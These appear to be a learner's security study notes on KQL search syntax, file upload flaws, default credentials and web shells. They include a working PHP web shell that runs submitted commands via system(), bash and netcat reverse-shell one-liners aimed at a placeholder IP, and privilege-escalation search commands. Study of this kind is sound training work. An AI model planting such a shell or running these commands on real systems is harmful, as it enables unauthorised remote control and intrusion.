**KQL Notes**

| **Query/Syntax** | **Description** | **Example** |
| --- | --- | --- |
| “  “ | Used to search for specific values within the documentations. Used for **exact** searches | “TryHackMe” |
| *  | Denotes a wildcard, which searches documents for similar matches to the value provided | United* (return United Kingdom and United States) |
| OR | Show documents that contain either of the values provided | “United Kingdom” OR “England” |
| AND | Show documents that contain **both** values | “Ben” AND “25” |
| : | To search (specified) field of a document for a value, such as IP address. Note that the field provided here will depend on the fields available in the index pattern | ip.address: 10.10.10.10 |

**File uploads**

File uploads are everywhere on websites, eg profile pictures, invoices, receipts etc. These features make user experience smoother and more efficient but also creates a risk if not properly secured. It can open up various vulnerabilities that attackers can exploit.

**File upload Vulnerabilities**

If a website does not check what kind of file is being uploaded, how big it is or what it contains, it opens the door to all sorts of attacks. For example:

- **RCE** (Remote Code Execution): Uploading a script that the server runs, which gives attacker control over it
- **XSS** (Cross Site Scripting): Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker’s server

**Unrestricted file uploads**

Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file’s contents aren’t properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script such as PHP file or an executable that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system

- Upload a script that server executes, leading to RCE
- Upload a crafted image file that triggers a vulnerability when processed by the server
- Uploading a web shell and browsing to it directly using a browser

**Usage of weak credentials**

Default credentials are often found in systems where administrators fail to change initial login details provided during setup. Attackers can use tools or try common credentials manually to break into the system.

| **Username** | **Password** |
| --- | --- |
| admin | admin |
| administrator | administrator |
| admin@domainname | admin |
| guest | guest |

**RCE (Remote Code Execution)**

RCE happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.

**Web Shell**

Web Shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once in place, attackers can run commands, manipulate files and use the compromised server as their own. They can even use it to launch attacks on other systems

- Execute commands on the server
- Move laterally within the network
- Download sensitive data or pivot to other services

A web shell typically gives the attacker a web-based interface to run commands. In some cases, attackers may use a reverse shell to establish a direct connection back to their system, allowing them to control the compromised machine remotely. Once an attacker has this level of access, they might attempt privilege escalation to gain even more control, such as achieving root access or moving deeper into the network.

```html
<html><body><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="text" name="command" autofocus id="command" size="50"><input type="submit" value="Execute"></form><pre><?php
    if(isset($_GET['command']))
    {
        system($_GET['command'] . ' 2>&1');
    }
?>
</pre></body></html>
```

PHP file. When accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using `system()` PHP function, and output is displayed to the user. 

Once vulnerability has been exploited and now have access to the operating system via a web shell, depending on a) what your goal is and b) what misconfigurations are present on the system, will determine exactly what we can do.

**Linux Commands** 

| **Command** | **Use** |
| --- | --- |
| ls | Will give you an idea of what files/directories surround you |
| cat | A command used to output the contents of documents such as text files |
| pwd | Will give you an idea of where in the system you are |
| whoami | Will let you know who you are in the system |
| hostname | The system name and potentially its role in the network |
| uname -a | Will give you some system information like the OS, kernel version, and more |
| id | If the current user is assigned to any groups |
| ifconfig | Allows you to understand the system's network setup |
| bash -i >& /dev/tcp/<your-ip>/<port> 0>&1 | A command used to begin a reverse shell via bash |
| nc -e /bin/sh <your-ip> <port> | A command used to begin a reverse shell via Netcat |
| find / -perm -4000 -type f 2>/dev/null | Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root) |
| find / -writable -type  f 2>/dev/null | grep -v "/proc/" | Also helpful in privilege escalation attempts used to find files with writable permissions |
